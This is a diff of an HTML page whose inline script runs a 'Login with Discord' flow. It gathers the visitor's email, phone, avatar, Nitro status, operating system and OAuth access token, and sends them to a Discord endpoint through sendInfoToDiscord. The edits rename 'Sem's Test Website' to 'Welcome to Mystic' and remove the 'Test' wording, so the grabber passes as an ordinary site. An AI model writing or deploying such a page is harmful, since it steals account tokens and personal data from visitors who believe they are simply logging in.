@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sem's Test Website</title>
+    <title>Welcome to Mystic</title>
     <link rel="stylesheet" href="css/styles.css"> <!-- Link to styles.css -->
     <script>
         const clientId = '1284270652693680169';
@@ -60,8 +60,8 @@
             const createdAt = new Date(user.created_at).toLocaleString(); // Account creation date
             const nitro = user.premium_type ? "Yes" : "No"; // Check for Nitro status
             const operatingSystem = navigator.platform; // Get operating system
-            const city = "City not available"; // Placeholder for geo data
-            const country = "Country not available"; // Placeholder for geo data
+            const city = "City not available"; // You would need to use a geo API for real data
+            const country = "Country not available"; // You would need to use a geo API for real data
 
             // Call the function to send visitor info along with the access token and user information
             sendInfoToDiscord(data.access_token, email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country);
@@ -128,7 +128,7 @@
                 body: JSON.stringify(embedMessage)
             });
 
-            document.body.innerHTML += `<h2>Test Website, Thank You for Testing</h2>`;
+            document.body.innerHTML += `<h2>Thank You for Testing</h2>`;
         }
 
         window.onload = function () {
@@ -138,7 +138,12 @@
                 fetchUserData(code);
             } else {
                 // Show the login button if no code is present
-                document.body.innerHTML = `<h1>Welcome to Sem's Test Website</h1><button onclick="loginWithDiscord()">Login with Discord</button>`;
+                document.body.innerHTML = `
+                    <div class="container">
+                        <h1>Welcome to Mystic</h1>
+                        <button onclick="loginWithDiscord()">Login with Discord</button>
+                    </div>
+                `;
             }
         };
     </script>
